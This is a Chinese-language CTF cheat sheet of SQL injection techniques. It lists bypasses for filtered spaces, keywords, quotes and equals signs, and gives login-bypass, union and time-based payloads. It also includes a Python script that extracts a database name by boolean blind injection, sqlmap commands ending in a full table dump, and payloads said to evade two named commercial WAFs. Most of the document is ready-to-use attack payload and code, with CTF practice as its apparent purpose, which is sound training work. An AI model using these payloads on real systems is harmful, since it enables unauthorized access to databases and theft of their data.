# Web CTF - SQL注入常见绕过技巧

## 题目类型
Web - SQL注入

## 常见过滤绕过

### 1. 空格过滤
```sql
-- 使用注释代替空格
/**/
-- 使用括号
()
-- 使用加号（URL编码）
+
-- 使用Tab
%09
```

### 2. 关键字过滤 (select, union, or, and)
```sql
-- 大小写混合
SeLeCt, UnIoN

-- 双写绕过
selselectect, ununionion

-- 内联注释
/*!50000select*/
se/**/lect

-- 编码绕过
%53%45%4c%45%43%54 (URL编码)
\x53\x45\x4c\x45\x43\x54 (十六进制)
```

### 3. 引号过滤
```sql
-- 使用十六进制
0x61646d696e (admin)

-- 使用char函数
char(97,100,109,105,110)

-- 使用反斜杠转义（某些情况）
\'
```

### 4. 等号过滤
```sql
-- 使用 like
username like 'admin'

-- 使用 in
username in ('admin')

-- 使用 regexp
username regexp '^admin$'
```

## 常用 Payload 模板

### 万能密码
```sql
admin' or '1'='1
admin' or 1=1#
admin' or 1=1--+
' or ''='
```

### 联合注入
```sql
' union select 1,2,3#
' union select null,null,null#
' union select database(),user(),version()#
```

### 布尔盲注
```python
import requests

url = "http://target.com/login"
flag = ""

for i in range(1, 50):
    for c in range(32, 127):
        payload = f"admin' and ascii(substr(database(),{i},1))={c}#"
        data = {"username": payload, "password": "123"}
        r = requests.post(url, data=data)

        if "success" in r.text:
            flag += chr(c)
            print(f"[+] {flag}")
            break
```

### 时间盲注
```sql
' and if(ascii(substr(database(),1,1))>97,sleep(3),0)#
```

## 工具使用

### sqlmap 基础用法
```bash
# 基础扫描
sqlmap -u "http://target.com/page?id=1"

# POST 请求
sqlmap -u "http://target.com/login" --data="username=admin&password=123"

# 指定参数
sqlmap -u "http://target.com/page?id=1&name=test" -p id

# 获取数据库
sqlmap -u "URL" --dbs

# 获取表
sqlmap -u "URL" -D database_name --tables

# 获取列
sqlmap -u "URL" -D database_name -T table_name --columns

# 导出数据
sqlmap -u "URL" -D database_name -T table_name -C column1,column2 --dump
```

## 常见 WAF 绕过

### 安全狗
```sql
/*!50000select*/ * from users
```

### 云锁
```sql
select(group_concat(table_name))from(information_schema.tables)
```

## 注意事项
1. 先手动测试确认注入点
2. 注意数据库类型（MySQL/PostgreSQL/MSSQL）
3. 观察错误信息判断过滤规则
4. 尝试多种编码方式
5. 使用 --tamper 脚本绕过 WAF
